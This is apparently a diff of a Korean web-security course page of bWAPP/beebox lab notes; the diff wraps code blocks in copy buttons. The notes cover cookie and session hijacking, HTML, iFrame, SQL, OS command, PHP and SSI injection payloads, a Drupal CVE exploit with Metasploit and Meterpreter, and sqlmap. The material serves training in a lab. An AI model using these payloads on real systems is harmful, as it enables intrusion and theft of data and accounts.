-<div class="codehilite"><pre><span></span><code>F12 → Storage(저장소) → Cookies
-</code></pre></div>
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>F12 → Storage(저장소) → Cookies
+</code></pre></div></div>
 
 <p>admin  쿠키 값이 0 으로 설정되어 있음</p>
 <p>콘솔에서 쿠키 값을 1 로 변경 후 새로 고침하면 잠금 해제</p>
-<div class="codehilite"><pre><span></span><code>// 콘솔에서 쿠키 값 변경
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// 콘솔에서 쿠키 값 변경
 document.cookie = &quot;admin=1&quot;;
-</code></pre></div>
+</code></pre></div></div>
 
 <h4 id="8-session-management--cookies">8. Session Management — Cookies</h4>
 <h5 id="8-1-cookie">8-1. 쿠키(Cookie) 기본 개념</h5>
@@ -3103,9 +3127,9 @@ document.cookie = &quot;admin=1&quot;;
 </table></div>
 <h5 id="8-2-http-only">8-2. HTTP-Only 옵션</h5>
 <p>HTTP-Only 옵션이 설정된 쿠키는 자바스크립트를 통해 쿠키에 접근하지 못하도록 차단한다.</p>
-<div class="codehilite"><pre><span></span><code>// document.cookie로 쿠키 값 확인 (HTTP-Only 미설정 시)
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// document.cookie로 쿠키 값 확인 (HTTP-Only 미설정 시)
 document.cookie
-</code></pre></div>
+</code></pre></div></div>
 
 <p>HTTP-Only 옵션이 설정되지 않으면 document.cookie  명령으로 쿠키 정보 노출</p>
 <p>쿠키에 날짜·시간 정보 등 민감한 정보가 포함된 경우 추가 문제 발생 가능</p>
@@ -3135,19 +3159,19 @@ document.cookie
 <h4 id="9-session-id-in-url-url-세션-id-노출">9. Session ID in URL (URL 세션 ID 노출)</h4>
 <h5 id="9-1_1">9-1. 취약점 개요</h5>
 <p>URL에 세션 아이디(PHPSESSID)가 포함되어 노출되는 취약점이다.</p>
-<div class="codehilite"><pre><span></span><code># 취약한 URL 예시
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 취약한 URL 예시
 http://[beeboxIP]/bwapp/sm_session_url.php?PHPSESSID=0EC...603
-</code></pre></div>
+</code></pre></div></div>
 
 <p>URL에 포함된 세션 ID 값이 실제 쿠키의 세션 ID 값과 동일</p>
 <p>세션 ID가 노출되면 공격자가 해당 세션을 탈취하여 해당 사용자로 접속 가능</p>
 <h5 id="9-2">9-2. 세션 탈취 테스트</h5>
-<div class="codehilite"><pre><span></span><code># 버프 스위트를 이용한 세션 탈취 테스트
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 버프 스위트를 이용한 세션 탈취 테스트
 1. 테스트 계정으로 로그인된 상태에서 버프 인터셉트 ON
 2. 페이지 새로 고침하여 요청 패킷 인터셉트
 3. 쿠키 헤더의 PHPSESSID 값을 b 계정의 세션 ID로 변조
 4. Forward → b 계정의 세션으로 접속됨을 확인
-</code></pre></div>
+</code></pre></div></div>
 
 <p>이렇게 세션 아이디를 탈취하여 다른 사용자로 접속하는 것을 세션 탈취라고 한다. 중요한 세션 아이디나 쿠키 값은 인코딩 처리를 하거나 일반적인 방법으로는 보이지 않게 해야 한다.</p>
 <h4 id="10-strong-sessions-세션-강도-확인">10. Strong Sessions (세션 강도 확인)</h4>
@@ -3156,12 +3180,12 @@ http://[beeboxIP]/bwapp/sm_session_url.php?PHPSESSID=0EC...603
 <p>정상 경로 접속: Welcome b  출력, 세션이 강하지 않다는 메시지 표시</p>
 <p>URL 직접 접속(다른 브라우저): 세션 정보가 없어 다른 메시지 출력</p>
 <h5 id="10-2">10-2. 세션 변조 테스트</h5>
-<div class="codehilite"><pre><span></span><code># 버프 스위트를 이용한 세션 변조 테스트
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 버프 스위트를 이용한 세션 변조 테스트
 1. 다른 브라우저에서 같은 페이지에 접속
 2. 버프 인터셉트 ON → 새로 고침
 3. 요청 패킷의 쿠키 값을 원래 b 계정 세션 ID로 변조
 4. Forward → 변조된 세션으로 웰컴 메시지 출력 확인
-</code></pre></div>
+</code></pre></div></div>
 
 <p>세션 ID가 변조되면 다른 사용자의 세션으로 접속 가능함을 확인</p>
 <p>이 방식으로 세션 관리 취약점 존재 여부를 점검할 수 있음</p>
@@ -3272,16 +3296,16 @@ http://[beeboxIP]/bwapp/sm_session_url.php?PHPSESSID=0EC...603
 <p>⚠️ beebox 머신은 마우스 위치가 맞지 않아 클릭이 불편할 수 있다. 가능하면 키보드로 메뉴를 이동하여 작업하는 것이 편리하다.</p>
 <h4 id="2-bwapp-실습-환경-접속">2. BWAPP 실습 환경 접속</h4>
 <h5 id="2-1-ip">2-1. IP 설정 및 네트워크 확인</h5>
-<div class="codehilite"><pre><span></span><code># IP 주소 확인
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># IP 주소 확인
 ifconfig
-</code></pre></div>
+</code></pre></div></div>
 
 <p>IP가 올라오지 않는 경우 수동으로 IP 설정 필요</p>
 <p>어댑터 브릿지 사용 시 ETH0이 아닌 ETH1에 IP가 올라올 수 있음</p>
 <p>칼리(Kali) 머신과 핑(ping)으로 통신 여부 확인</p>
-<div class="codehilite"><pre><span></span><code># etc/network/interfaces 수동 설정 (IP가 올라오지 않는 경우)
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># etc/network/interfaces 수동 설정 (IP가 올라오지 않는 경우)
 vi /etc/network/interfaces
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="2-2-bwapp">2-2. BWAPP 접속 방법</h5>
 <div class="tablewrap"><table>
@@ -3374,9 +3398,9 @@ vi /etc/network/interfaces
 </table></div>
 <h5 id="3-2-low_2">3-2. Low 레벨 실습</h5>
 <p>입력 폼에 HTML 태그를 그대로 입력하면 태그로 실행된다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;!-- H1 태그 삽입 예시 --&gt;
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;!-- H1 태그 삽입 예시 --&gt;
 &lt;h1&gt;테스트&lt;/h1&gt;
-</code></pre></div>
+</code></pre></div></div>
 
 <p>태그가 실행되어 화면에 큰 글자로 출력됨을 확인</p>
 <h5 id="3-3-medium-url">3-3. Medium 레벨 — URL 인코딩 우회</h5>
@@ -3404,9 +3428,9 @@ vi /etc/network/interfaces
 </tr>
 </tbody>
 </table></div>
-<div class="codehilite"><pre><span></span><code># URL 인코딩된 H1 태그 예시
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># URL 인코딩된 H1 태그 예시
 %3Ch1%3E테스트%3C%2Fh1%3E
-</code></pre></div>
+</code></pre></div></div>
 
 <p>온라인 URL 인코딩/디코딩 사이트를 활용하여 변환 가능</p>
 <p>인코딩된 값을 입력 폼에 넣으면 Medium 레벨에서도 인젝션 성공</p>
@@ -3415,9 +3439,9 @@ vi /etc/network/interfaces
 <p>HTML 태그뿐만 아니라 인코딩된 태그도 모두 일반 문자열로 처리되어 인젝션이 차단된다.</p>
 <h5 id="3-5-stored-html-injection">3-5. Stored HTML Injection</h5>
 <p>저장형의 경우 게시판에 HTML 태그를 집어넣고 서브밋하면, 이후 해당 게시글에 접근하는 모든 사용자에게 태그가 실행된다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;!-- 저장형 예시 — 향후 접속 시마다 실행 --&gt;
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;!-- 저장형 예시 — 향후 접속 시마다 실행 --&gt;
 &lt;h1&gt;해킹&lt;/h1&gt;
-</code></pre></div>
+</code></pre></div></div>
 
 <p>저장형(Stored)이기 때문에 게시판에 들어오면 언제든지 실행된다. iFrame, imageSRC 등 다양한 태그를 이용하면 악성 코드나 다른 파일도 실행 가능하다.</p>
 <h4 id="4-a1-인젝션--iframe-injection">4. A1 인젝션 — iFrame Injection</h4>
@@ -3449,9 +3473,9 @@ vi /etc/network/interfaces
 </tr>
 </tbody>
 </table></div>
-<div class="codehilite"><pre><span></span><code># URL 파라미터 조작 예시 — beebox BWAPP 사이트 삽입
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># URL 파라미터 조작 예시 — beebox BWAPP 사이트 삽입
 ?url=http://192.168.[beebox IP]/bwapp&amp;width=500&amp;height=500
-</code></pre></div>
+</code></pre></div></div>
 
 <p>width=0 , height=0 으로 설정하면 프레임이 보이지 않아 일반 사용자가 클릭 시 연결됨</p>
 <p>공격자가 배너나 이벤트 당첨 글자를 넣고 클릭을 유도하면 피싱 사이트로 이동시킬 수 있다. 또한 크기를 0으로 줘서 보이지 않게 해도 클릭 시 연결이 되도록 만들 수 있다.</p>
@@ -3492,9 +3516,9 @@ vi /etc/network/interfaces
 <h5 id="5-2-ldap-injection-low">5-2. LDAP Injection 실습 (Low 레벨)</h5>
 <p>LDAP 서버에 잘못된 쿼리를 주었을 때의 반응을 확인하여 취약점을 탐색한다.</p>
 <p>버프 스위트 HTTP 히스토리에서 ldap_connect.php  관련 패킷을 확인하면, 응답 내 자바스크립트 clear  함수가 존재함을 확인할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code># URL에 직접 파라미터 추가하여 우회
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># URL에 직접 파라미터 추가하여 우회
 http://[beeboxIP]/bwapp/ldap_connect.php?clear=yes
-</code></pre></div>
+</code></pre></div></div>
 
 <p>clear=yes  파라미터를 URL에 추가하면 LDAP 연결 설정이 초기화(클리어)되어 성공 메시지 출력</p>
 <p>Medium 레벨에서는 내부 코드 필터링과 clear=yes  처리가 내부적으로만 동작하도록 코드화되어 있어 동일한 방법으로 우회 불가</p>
@@ -3544,9 +3568,9 @@ http://[beeboxIP]/bwapp/ldap_connect.php?clear=yes
 </tr>
 </tbody>
 </table></div>
-<div class="codehilite"><pre><span></span><code># 수신자 필드에 BCC 삽입 예시
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 수신자 필드에 BCC 삽입 예시
 test@naver.com%0aBCC:other@kakao.com
-</code></pre></div>
+</code></pre></div></div>
 
 <p>Low 레벨에서는 이러한 삽입이 그대로 허용됨</p>
 <p>Medium/High 레벨에서는 버프 스위트 등 프락시 도구로 인터셉트하여 작업해야 함</p>
@@ -3581,10 +3605,10 @@ test@naver.com%0aBCC:other@kakao.com
 </tr>
 </tbody>
 </table></div>
-<div class="codehilite"><pre><span></span><code># 세미콜론을 이용한 OS Command Injection 예시
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 세미콜론을 이용한 OS Command Injection 예시
 nslookup 대상도메인; id
 nslookup 대상도메인; cat /etc/passwd
-</code></pre></div>
+</code></pre></div></div>
 
 <p>Low 레벨: 세미콜론으로 명령어 연결 시 실행 결과 출력됨</p>
 <p>Medium 레벨: 세미콜론이 막혀있으면 파이프( | ) 등 다른 기호로 시도</p>
@@ -3598,15 +3622,15 @@ nslookup 대상도메인; cat /etc/passwd
 <h5 id="8-1">8-1. 취약점 개요</h5>
 <p>URL 파라미터에 PHP 코드를 삽입하여 서버에서 실행시키는 취약점이다. message  파라미터에 들어가는 값이 서버에서 처리되는 구조에서 발생한다.</p>
 <h5 id="8-2-low">8-2. Low 레벨 실습</h5>
-<div class="codehilite"><pre><span></span><code># URL에서 message 파라미터 변경
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># URL에서 message 파라미터 변경
 http://[beeboxIP]/bwapp/phpi.php?message=test;system(&#39;ls -al&#39;)
-</code></pre></div>
+</code></pre></div></div>
 
 <p>system()  함수: 괄호 안의 문자열을 OS 명령어로 실행</p>
 <p>세미콜론 뒤에 PHP 코드를 삽입하면 서버에서 실행됨</p>
-<div class="codehilite"><pre><span></span><code># id 명령어 실행 예시
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># id 명령어 실행 예시
 message=test;system(&#39;id&#39;)
-</code></pre></div>
+</code></pre></div></div>
 
 <p>ls -al  실행 결과, id  실행 결과 등이 화면에 출력됨</p>
 <p>입력되는 message  파라미터에 검증 절차가 없어 취약점 발생</p>
@@ -3646,9 +3670,9 @@ message=test;system(&#39;id&#39;)
 <p>보안 관점에서 SSL이 더 유리하다. CSL만으로 구성된 사이트에 악성 코드가 삽입되면 각 클라이언트에서 직접 실행되지만, SSL은 서버에서만 실행되므로 각 클라이언트에 영 향이 적다.</p>
 <h5 id="9-2-ssi-injection">9-2. SSI Injection 실습</h5>
 <p>SSI Injection은 서버 측 언어가 처리되는 환경에서 추가적인 PHP 코드나 명령어를 삽입하는 공격이다.</p>
-<div class="codehilite"><pre><span></span><code>&lt;!-- SSI 태그를 이용한 PHP 코드 삽입 예시 --&gt;
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>&lt;!-- SSI 태그를 이용한 PHP 코드 삽입 예시 --&gt;
 &lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;
-</code></pre></div>
+</code></pre></div></div>
 
 <p>PHP의 exec()  함수를 이용하여 cmd 파라미터로 명령어 실행</p>
 <p>서버에서 해당 코드가 처리되면 /etc/passwd  파일 내용이 클라이언트 브라우저에 출력됨</p>
@@ -3661,26 +3685,26 @@ message=test;system(&#39;id&#39;)
 <p>문자 하나씩 입력할 때마다 해당 문자가 포함된 항목이 즉시 출력됨</p>
 <p>예: i  입력 → i 가 포함된 영화 목록 출력, ir  입력 → ir 이 포함된 목록 출력</p>
 <h5 id="1-2-sql-injection">1-2. SQL Injection 시도</h5>
-<div class="codehilite"><pre><span></span><code>-- Ajax 페이지에서 전체 출력 유도
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- Ajax 페이지에서 전체 출력 유도
 &#39; or &#39;1&#39;=&#39;1
 &#39; or 1=1 --
 &#39; or 1=1 -- (공백 포함)
-</code></pre></div>
+</code></pre></div></div>
 
 <p>작은 따옴표만 입력해도 특이한 반응이 있으면 취약점 의심 가능</p>
 <p>Union Select를 이용하여 DB 정보 조회 가능</p>
-<div class="codehilite"><pre><span></span><code>-- union select를 이용한 DB 정보 조회 예시 (칼럼 수 맞춰야 함)
+<div class="code-shell" data-language="SQL"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">SQL</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- union select를 이용한 DB 정보 조회 예시 (칼럼 수 맞춰야 함)
 &#39; union select 1,database(),3,4,5,6,7 from information_sche
 ma.tables --
-</code></pre></div>
+</code></pre></div></div>
 
 <p>Ajax는 비동기 방식으로 처리되는 것뿐, 실제 SQL Injection 취약점이 존재하면 동일하게 공략할 수 있다. 입력되는 처리 방식이 다를 뿐 취약점은 동일하다.</p>
 <h4 id="2-sql-injection--captcha">2. SQL Injection — Captcha</h4>
 <h5 id="2-1-captcha">2-1. Captcha 우회 방법</h5>
 <p>Captcha가 있는 로그인 페이지에서는 Captcha 값을 정확히 입력한 후 SQL Injection을 진행한다.</p>
-<div class="codehilite"><pre><span></span><code>-- Captcha 입력 후 동일하게 SQL Injection 시도
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- Captcha 입력 후 동일하게 SQL Injection 시도
 &#39; or &#39;1&#39;=&#39;1
-</code></pre></div>
+</code></pre></div></div>
 
 <p>Captcha를 정상 입력하고 로그인 버튼 클릭 시 해당 요청을 버프에서 인터셉트</p>
 <p>인터셉트한 요청에서 Captcha 값을 고정한 상태로 SQL Injection 쿼리 적용</p>
@@ -3688,31 +3712,31 @@ ma.tables --
 <h4 id="3-sql-injection--login-form-getpost">3. SQL Injection — Login Form (GET/POST)</h4>
 <h5 id="3-1-get-search">3-1. GET 방식 (Search)</h5>
 <p>URL에 파라미터가 노출되는 방식이다.</p>
-<div class="codehilite"><pre><span></span><code>-- 전체 영화 목록 출력
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- 전체 영화 목록 출력
 &#39; or &#39;1&#39;=&#39;1
 -- 1번 영화
 1
 -- 2번 영화
 2
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="3-2-post-select">3-2. POST 방식 (Select)</h5>
 <p>POST 방식에서는 파라미터가 URL에 노출되지 않으므로 버프 스위트를 사용한다.</p>
-<div class="codehilite"><pre><span></span><code># 버프 스위트에서 Send to Repeater 활용
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 버프 스위트에서 Send to Repeater 활용
 우클릭 → Send to Repeater → Repeater 탭에서 SQL 쿼리 입력 후 Send
 -- Repeater에서 파라미터에 작은 따옴표 삽입하여 반응 확인
 movie=&#39;
 -- 전체 목록 출력 시 취약점 존재 확인
-</code></pre></div>
+</code></pre></div></div>
 
 <p>POST 방식은 파라미터가 보이지 않으니 프락시 도구로 잡아서 작업하면 된다. 반복 작업이 필요하면 Send to Repeater를 활용한다.</p>
 <h4 id="4-sql-injection--로그인-폼-슈퍼히어로--일반-사용자">4. SQL Injection — 로그인 폼 (슈퍼히어로 / 일반 사용자)</h4>
 <h5 id="4-1_11">4-1. 로그인 폼 인젝션 실습</h5>
-<div class="codehilite"><pre><span></span><code>-- 아이디 필드에 작은 따옴표 삽입하여 Syntax Error 확인
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- 아이디 필드에 작은 따옴표 삽입하여 Syntax Error 확인
 &#39;
 -- 패스워드 필드에 SQL 쿼리 삽입
 &#39; or &#39;1&#39;=&#39;1
-</code></pre></div>
+</code></pre></div></div>
 
 <p>패스워드 필드에 SQL Injection 성공 시 Neo 라는 슈퍼히어로 계정으로 로그인</p>
 <p>해당 계정의 시크릿 메시지까지 확인 가능</p>
@@ -3721,11 +3745,11 @@ movie=&#39;
 <p>SQLite는 안드로이드 모바일 앱 등에서 데이터가 많지 않은 경량 데이터를 저장할 때 자주 사용하는 DBMS이다.</p>
 <h5 id="5-2_6">5-2. 인젝션 방법 차이</h5>
 <p>일반 MySQL에서 사용하는 #  주석 대신 다른 주석 방식을 사용해야 할 수 있다.</p>
-<div class="codehilite"><pre><span></span><code>-- SQLite에서 주석 방식 시도
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- SQLite에서 주석 방식 시도
 &#39; or 1=1 #
 &#39; or 1=1 --
 &#39; or 1=1 -- (공백 포함 주석)
-</code></pre></div>
+</code></pre></div></div>
 
 <p>작은 따옴표 삽입 시 HY000  형태의 에러 응답 확인 → 취약점 존재 가능성</p>
 <ul>
@@ -3742,18 +3766,18 @@ movie=&#39;
 <p>2014년에 발견된 SQL Injection 취약점이 존재 (CVE-2014-3704)</p>
 <p>버전 7.0~7.31 사이에서 발생하는 취약점</p>
 <h5 id="6-2-cve">6-2. CVE 코드를 이용한 공격 (수동 방식)</h5>
-<div class="codehilite"><pre><span></span><code># CVE 코드 다운로드 후 파일 수정
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># CVE 코드 다운로드 후 파일 수정
 # 다운로드된 PHP 파일(예: 44355.php)에서 Drupal URL 부분 변경
 # 변경할 부분: 공격 대상 Drupal 주소
 http://[beeboxIP]/drupal/
 # PHP 파일 실행
 php 44355.php
-</code></pre></div>
+</code></pre></div></div>
 
 <p>실행 후 관리자 계정( admin ) 패스워드 정보 획득 가능</p>
 <p>Exploit-DB(https://www.exploit-db.com)에서 CVE 코드 검색 및 다운로드 가능</p>
 <h5 id="6-3-metasploit-framework">6-3. Metasploit Framework를 이용한 공격</h5>
-<div class="codehilite"><pre><span></span><code># Metasploit 실행
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># Metasploit 실행
 msfconsole
 # Drupal SQL Injection 모듈 검색
 search drupal
@@ -3768,7 +3792,7 @@ set LHOST [칼리IP]
 set TARGETURI /drupal
 # 공격 실행
 run
-</code></pre></div>
+</code></pre></div></div>
 
 <p>Meterpreter 셸에서 사용 가능한 주요 명령어</p>
 <div class="tablewrap"><table>
@@ -3813,7 +3837,7 @@ run
 </tr>
 </tbody>
 </table></div>
-<div class="codehilite"><pre><span></span><code># Meterpreter 내에서 시스템 정보 확인
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># Meterpreter 내에서 시스템 정보 확인
 sysinfo
 # 프로세스 목록 확인
 ps
@@ -3825,7 +3849,7 @@ shell
 cat /etc/passwd
 # Meterpreter 종료
 exit
-</code></pre></div>
+</code></pre></div></div>
 
 <p>세션에서 완전히 빠져나오려면 Ctrl+C → Y → exit 를 순서대로 입력하면 된다.</p>
 <h4 id="7-sql-injection--user-agent">7. SQL Injection — User-Agent</h4>
@@ -3835,29 +3859,29 @@ exit
 <p>SQL Injection 삽입 위치가 폼이 아닌 User-Agent 헤더 값</p>
 <h5 id="7-2_3">7-2. 실습 방법</h5>
 <p>버프 스위트로 요청을 인터셉트하여 User-Agent 헤더 값을 조작한다.</p>
-<div class="codehilite"><pre><span></span><code># 버프 스위트 인터셉트 후 User-Agent 헤더 수정
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 버프 스위트 인터셉트 후 User-Agent 헤더 수정
 User-Agent: &#39; or 1=1 #
-</code></pre></div>
+</code></pre></div></div>
 
 <p>Stored 방식이므로 접속할 때마다 로그로 누적 저장됨</p>
 <p>삽입 위치만 다를 뿐 기본 SQL Injection과 동일</p>
 <h4 id="8-sql-injection--xml--xpath">8. SQL Injection — XML / XPath</h4>
 <h5 id="8-1-xpath">8-1. XPath 개념</h5>
 <p>XPath(XML Path)는 XML 문서나 HTML 문서 내에서 특정 요소(객체)의 위치를 나타내는 고유한 경로값이다.</p>
-<div class="codehilite"><pre><span></span><code># XPath 경로 예시
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># XPath 경로 예시
 /html/body/div[2]/div[1]/img
-</code></pre></div>
+</code></pre></div></div>
 
 <p>파이썬으로 웹 스크래핑 시 특정 정보만 가져올 때(스크래핑) XPath 경로 활용</p>
 <p>크롤링: 페이지 내 모든 정보를 끌고 오는 것</p>
 <p>스크래핑: 내가 원하는 정보만 가져오는 것</p>
 <h5 id="8-2-xml-injection">8-2. XML Injection 실습</h5>
 <p>장르를 선택하는 파라미터에 SQL 쿼리를 삽입한다.</p>
-<div class="codehilite"><pre><span></span><code>-- 작은 따옴표 삽입으로 에러 반응 확인
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>-- 작은 따옴표 삽입으로 에러 반응 확인
 &#39;
 -- 전체 목록 출력 유도
 &#39; or &#39;1&#39;=&#39;1&#39; and (&#39;a&#39;=&#39;a
-</code></pre></div>
+</code></pre></div></div>
 
 <p>에러 메시지 반응이 있으면 취약점 존재 의심</p>
 <p>복잡한 쿼리 문법이 필요하며 수동 점검 시 SQL 쿼리 문에 대한 이해가 필요</p>
@@ -3868,12 +3892,12 @@ User-Agent: &#39; or 1=1 #
 <p>여러 가지 기호와 쿼리를 하나씩 시도하여 반응 차이 확인</p>
 <p>자동화 도구 sqlmap 활용 권장</p>
 <h5 id="9-2-sqlmap">9-2. sqlmap 활용</h5>
-<div class="codehilite"><pre><span></span><code># sqlmap 기본 사용법
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># sqlmap 기본 사용법
 sqlmap -u &quot;http://[beeboxIP]/bwapp/취약한페이지.php?파라미터=
 값&quot; --dbs
 # 도움말 확인
 sqlmap -h
-</code></pre></div>
+</code></pre></div></div>
 
 <p>h  또는 -help  옵션으로 상세한 옵션 사용법 확인 가능</p>
 <p>SQL Injection 취약점이 있는 파라미터에 대해 자동으로 DB 정보, 테이블 정보, 계정 정보까지 획득 가능</p>
@@ -3891,6 +3915,22 @@ if(q){
     document.querySelectorAll('aside .part').forEach(p=>{p.style.display = v ? 'none' : '';});
   });
 }
+document.querySelectorAll('.code-copy').forEach(button=>{
+  button.addEventListener('click', async ()=>{
+    const code=button.closest('.code-shell')?.querySelector('code');
+    if(!code) return;
+    const value=code.innerText;
+    try{
+      await navigator.clipboard.writeText(value);
+    }catch(e){
+      const area=document.createElement('textarea');
+      area.value=value; document.body.appendChild(area); area.select();
+      document.execCommand('copy'); area.remove();
+    }
+    const old=button.textContent; button.textContent='복사됨';
+    setTimeout(()=>{button.textContent=old;},1200);
+  });
+});
 const inchap=[...document.querySelectorAll('aside .inchap a')];
 if(inchap.length){
   const byId=Object.fromEntries(inchap.map(a=>[a.hash.slice(1),a]));
